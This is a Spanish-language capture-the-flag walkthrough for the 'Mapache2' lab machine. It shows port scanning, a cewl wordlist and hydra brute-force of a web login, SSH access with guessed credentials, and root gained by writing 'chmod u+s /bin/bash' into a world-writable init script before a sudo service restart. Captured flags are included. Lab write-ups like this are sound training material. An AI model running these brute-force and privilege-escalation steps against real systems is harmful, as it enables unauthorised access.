---
icon: flag
---

# CTF Mapache2 Intermediate

URL Download CTF = [https://drive.google.com/file/d/1bQs7wYBclu7aTWxt5d3SpcY\_yL0d9-8b/view?usp=sharing](https://drive.google.com/file/d/1bQs7wYBclu7aTWxt5d3SpcY_yL0d9-8b/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip mapache2.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh mapache2.tar
```

Info:

```
_________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 06:08 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000026s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:9e:60:04:ea:da:48:98:7a:e3:eb:f5:8e:25:83:33 (ECDSA)
|_  256 64:0a:26:78:24:8e:1a:75:54:5a:58:bc:f4:18:ce:4e (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Hackerspace - Welcome
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    We have to change this, I told Medusa to protect this more.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=8/24%Time=66C9B147%P=x86_64-pc-linux-gnu%r
SF:(NULL,3C,"We\x20have\x20to\x20change\x20this,\x20I\x20told\x20Medusa\x2
SF:0to\x20protect\x20this\x20more\.\n");
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
```

Por lo que vemos hay un puerto `3306` que pertenece a `mysql` pero si nos intentamos conectar a el, vemos que no nos deja como si no estuviera dicho puerto, si utilizamos `nc` para ver que pasa por ahi veremos esto.

## Netcat

```shell
nc <IP> 3306
```

Info:

```
We have to change this, I told Medusa to protect this more.
```

Solo nos dice ese mensaje por lo que suponemos que sera un usuario, iremos a la pagina web que hay, veremos dentro que hay un boton de `Login` en el que nos lleva a un inicio de sesion, como descubrimos antes que hay un usuario crearemos un diccionario de contraseñas para probar con el usuario en la pagina del login de la siguiente forma.

## cewl

```shell
cewl http://<IP>/ -w dic.txt
```

Esto nos creara un diccionario de palabras de la pagina web de la pagina principal, despues le tiraremos un `hydra` al formulario web con ese diccionario y ese usuario.

## hydra

```shell
hydra -l medusa -P dic.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-23 15:19:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 138 login tries (l:1/p:138), ~9 tries per task
[DATA] attacking http-post-form://172.18.0.2:80/login.php:username=^USER^&password=^PASS^:Invalid credentials
[80][http-post-form] host: 172.18.0.2   login: medusa   password: enthusiasts
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-23 15:19:14
```

Vemos que nos saca unas credenciales, por lo que las utilizaremos en el login, vemos que nos inicia sesion metiendo dichas credenciales y que vemos una pagina `secreta` pero si inspeccionamos el codigo y bajamos un poco, veremos lo siguiente.

```html
<!-- I hope my boss doesn't kill me, but I tell kinder what a mess medusa made with the message from the port. -->
```

Nos da una pista de un usuario llamado `Kinder` por lo que podremos probar a tirar un diccionario de usuarios como `Kinder` y `medusa`, y en las contraseñas poner el mismo diccionario o probarlo a mano, si nos conectamos por `SSH` poniendo el usuario `Kinder` y como contraseña `medusa` veremos que nos deja entrar.

## SSH

```shell
ssh Kinder@<IP>
```

Y si metemos como contraseña `medusa` estaremos dentro por lo que leeremos la flag.

> user.txt

```
497686fad25d7b5464ac8fd745ad1b17
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for Kinder on fa1a5452dc43:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User Kinder may run the following commands on fa1a5452dc43:
    (ALL : ALL) NOPASSWD: /usr/sbin/service apache2 restart
```

Vemos que podemos reiniciar el servidor de apache2, por lo que aprovecharemos eso para ir a los ficheros de configuracion para meter ahi codigo para que cuando lo reiniciemos podamos ser `root`.

```shell
cd /etc/init.d/
```

Si nos vamos a esa ubicacion veremos lo siguiente.

```
total 36
drwxrwxrwx 1 root root 4096 Aug 23 21:09 .
drwxr-xr-x 1 root root 4096 Aug 24 12:08 ..
-rwxr-xr-x 1 root root 2489 Mar 18 12:41 apache-htcacheclean
-rwxrwxrwx 1 root root 8141 Aug 23 21:07 apache2
-rwxr-xr-x 1 root root 3152 Dec  5  2023 dbus
-rwxr-xr-x 1 root root 1421 Aug 23 20:08 message-server
-rwxr-xr-x 1 root root  959 Mar 24 16:35 procps
-rwxr-xr-x 1 root root 4060 Apr  4 00:09 ssh
```

Vemos que podemos editar el archivo de configuracion de `apache2` por lo que haremos lo siguiente.

```shell
nano apache2

#Dentro del nano
#!/bin/bash
chmod u+s /bin/bash
#RESTO DEL CODIGO
```

Lo guardamos y ahora haremos lo siguiente para que se ejecute como `root`.

```shell
sudo service apache2 restart
```

Una vez hecho esto, veremos si ha funcionado.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Por lo que vemos funciono, asi que haremos lo siguiente.

```shell
bash -p
```

Y con esto ya seremos `root`, por lo que leeremos la flag.

> root.txt

```
e180269a01be15fc0b889bd34fd93c5c
```
